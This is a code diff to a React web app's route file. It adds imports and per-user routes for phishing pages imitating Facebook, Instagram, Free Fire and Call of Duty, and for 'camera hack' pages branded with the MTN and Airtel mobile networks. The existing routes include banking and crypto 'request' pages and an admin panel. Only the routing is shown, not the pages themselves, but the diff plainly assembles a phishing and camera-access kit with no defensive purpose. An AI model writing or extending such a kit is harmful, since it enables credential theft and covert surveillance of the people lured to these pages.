@@ -18,6 +18,17 @@ import BankingRequest from "./pages/BankingRequest";
 import CryptoRequest from "./pages/CryptoRequest";
 import Admin from "./pages/Admin";
 import NotFound from "./pages/NotFound";
+import NotFoundError from "./pages/NotFoundError";
+
+// Phishing Pages
+import FacebookPhishing from "./pages/phishing/Facebook";
+import InstagramPhishing from "./pages/phishing/Instagram";
+import FreeFirePhishing from "./pages/phishing/FreeFire";
+import CallOfDutyPhishing from "./pages/phishing/CallOfDuty";
+
+// Camera Hack Pages
+import MTNCameraHack from "./pages/camera/MTN";
+import AirtelCameraHack from "./pages/camera/Airtel";
 
 const queryClient = new QueryClient();
 
@@ -41,6 +52,20 @@ const App = () => (
           <Route path="/banking-request" element={<BankingRequest />} />
           <Route path="/crypto-request" element={<CryptoRequest />} />
           <Route path="/admin" element={<Admin />} />
+          
+          {/* Phishing Pages */}
+          <Route path="/phishing/facebook/:userId" element={<FacebookPhishing />} />
+          <Route path="/phishing/instagram/:userId" element={<InstagramPhishing />} />
+          <Route path="/phishing/freefire/:userId" element={<FreeFirePhishing />} />
+          <Route path="/phishing/callofduty/:userId" element={<CallOfDutyPhishing />} />
+          
+          {/* Camera Hack Pages */}
+          <Route path="/cam/mtn/:userId" element={<MTNCameraHack />} />
+          <Route path="/cam/airtel/:userId" element={<AirtelCameraHack />} />
+          
+          {/* 404 Pages */}
+          <Route path="/404-not-found" element={<NotFoundError />} />
+          
           {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
           <Route path="*" element={<NotFound />} />
         </Routes>
